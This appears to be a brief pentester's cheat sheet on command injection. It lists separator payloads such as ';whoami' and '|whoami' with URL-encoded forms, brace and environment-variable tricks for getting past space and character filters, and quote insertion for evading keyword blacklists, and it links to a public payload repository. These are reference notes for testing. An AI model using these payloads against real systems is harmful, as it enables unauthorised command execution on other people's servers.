# command injection


## payloads

Test command with:

    ;whoami - %3bwhoami
    |whoami - %7cwhoami
    &&whoami - %26%26whoami
    \nwhoami - %0awhoami

### Bypassing space filters

    ;{ls,-la}

### Bypassing character filters

    ${LS_COLORS:10:1} ;
    ${IFS} \t
    ${PATH:0:1} /

### Bypassing blacklister keywords

Try adding single quotes or double quotes to characters

    wh'o'ami
    wh"o"ami


## Resources

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#command-injection